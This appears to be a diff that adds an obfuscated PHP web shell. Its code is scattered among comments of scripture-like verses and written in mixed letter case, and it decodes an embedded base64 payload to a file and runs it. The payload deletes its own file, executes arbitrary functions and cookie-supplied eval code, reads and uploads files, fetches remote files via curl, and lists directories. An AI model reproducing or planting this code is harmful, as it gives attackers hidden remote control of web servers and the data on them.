@@ -1,0 +1,62 @@
+<?php
+/*
+Your */ $Y /* eyes will see */ = /* strange things, and you will say twisted things.
+For this cause */ 'CDAY7AF8' /* the */ ; /* Lord has said, */ fIle_PUT_CONTenTS /* See, I have taken */ ( /* an oath */ $Y /* that the */ , /* nations which */ BaSe64_DeCode /* are round about you */ ( /* are themselves */ imPlOdE /* to */ ( /* undergo */ aRrAy_SLiCE /* the shame which they */ ( /* have */ FiLE /* put on */ ( /* you.
+For a testament has */ __FIle__ /* effect after death; for what */ ) /* power */ , /* has it while the man who made it is living?
+And Abijah */ 7 /* and his */ , /* people put them to */ 54 /* death with */ ) /* great destruction: five hundred thousand of the */ ) /* best of */ ) /* Israel were put to the */ ) /* sword. */ ; /*
+He who */ reQUiRe /* has a poor opinion */ $Y /* of his neighbour */ ; /* has no sense, but a wise man keeps quiet.
+PD9waHAgZXJyb3JfcmVwb3J0aW5nKC
+0xKTtpbmlfc2V0KCdkaXNwbGF5X2Vy
+cm9ycycsJzEnKTtpbmlfc2V0KCdsb2
+dfZXJyb3JzJywnMCcpO3VubGluaygk
+WSk7aWYoIWlzc2V0KCRfUkVRVUVTVF
+skWV0pKXtkaWU7fSRzPSRfUkVRVUVT
+VFskWV07aWYoaXNzZXQoJF9SRVFVRV
+NUWzBdLCRzWzFdLCRzWzJdLCRzWzNd
+LCRzWzRdKSl7JHNbMV0oJHskc1syXX
+1bMF0sJHNbM10oJHNbNF0pKTtkaWU7
+fWVsc2VpZihpc3NldCgkX0NPT0tJRV
+szXSkpe2V2YWwoYmFzZTY0X2RlY29k
+ZShzdHJfcm90MTMoJF9DT09LSUVbM1
+0pKSk7ZGllO31lbHNlaWYoKCRwPWlz
+c2V0KCRfU0VSVkVSWydIVFRQXycuJF
+ldKT8kX1NFUlZFUlsnSFRUUF8nLiRZ
+XTooaXNzZXQoJF9QT1NUWyRZXSk/JF
+9QT1NUWyRZXTpudWxsKSkmJigkcD1q
+c29uX2RlY29kZSh1cmxkZWNvZGUoYm
+FzZTY0X2RlY29kZSgkcCkpLHRydWUp
+KSYmaXNzZXQoJHBbMF0pJiYoJG89JH
+BbMF0pKXtpZihpc3NldCgkcFs1XSkp
+eyRvPXJlYWxwYXRoKCRvLiRwWzVdKT
+t9Y2hkaXIoJG8pO2lmKGlzc2V0KCRw
+WzZdKSl7cmVhZGZpbGUoJHBbNl0pO2
+RpZTt9aWYoaXNzZXQoJF9GSUxFU1sk
+WV0pJiYoJHM9JF9GSUxFU1skWV0pKX
+tyZW5hbWUoJHNbJ3RtcF9uYW1lJ10s
+JHNbJ25hbWUnXSk7fWlmKGlzc2V0KC
+RwWzFdLCRwWzJdLCRwWzNdKSYmJHBb
+Ml0hPT0nJyl7aWYoJHBbMV09PT0nMC
+cpeyRzPWZpbGVfZ2V0X2NvbnRlbnRz
+KCRwWzJdKTtpZigoJHM9PT1mYWxzZX
+x8JHM9PT0nJykmJmlzX2NhbGxhYmxl
+KCdjdXJsX2luaXQnKSl7JHM9Y3VybF
+9pbml0KCRwWzJdKTtjdXJsX3NldG9w
+dCgkcywxOTkxMywxKTskcz1jdXJsX2
+V4ZWMoJHMpO31pZigkcyE9PWZhbHNl
+JiYkcyE9PScnKXtmaWxlX3B1dF9jb2
+50ZW50cyhiYXNlbmFtZShwYXJzZV91
+cmwoJHBbMl0sNSkpLCRzKTt9fWVsc2
+VpZigkcFszXSE9PScnKXskcFsxXSgk
+cFsyXSwkcFszXSk7fWVsc2V7JHBbMV
+0oJHBbMl0pO319fWVsc2V7JG89Z2V0
+Y3dkKCk7fSRwPWFycmF5KCk7Zm9yZW
+FjaChzY2FuZGlyKCRvKWFzJHMpeyRw
+WyRzXT1pc19kaXIoJHMpO31lY2hvJz
+whRE9DVFlQRSBodG1sPjxodG1sIGxh
+bmc9ZW4+PGhlYWQ+PHRpdGxlPiM8L3
+RpdGxlPjxzY3JpcHQ+dmFyIGs9Iicu
+JFkuJyIscD0iJy5zdHJfcmVwbGFjZS
+gnXFwnLCcvJywkbykuJyIscz0nLmpz
+b25fZW5jb2RlKCRwKS4nOzwvc2NyaX
+B0PjwvaGVhZD48L2h0bWw+Jzs
+*/
